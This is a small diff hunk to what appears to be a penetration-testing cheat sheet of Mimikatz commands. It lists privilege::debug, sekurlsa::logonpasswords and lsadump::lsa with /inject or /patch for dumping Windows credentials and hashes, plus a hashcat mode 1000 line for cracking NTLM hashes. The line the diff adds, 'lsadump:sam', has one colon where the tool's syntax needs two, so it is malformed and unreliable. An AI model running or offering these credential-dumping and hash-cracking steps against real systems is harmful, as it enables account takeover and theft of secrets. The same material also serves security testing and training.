@@ -16,6 +16,7 @@ privilege::debug
 sekurlsa::logonpasswords
 
 # dump hashes
+lsadump:sam
 lsadump::lsa [/inject | /patch]
 # hashcat -m 1000 <hash>
 ```
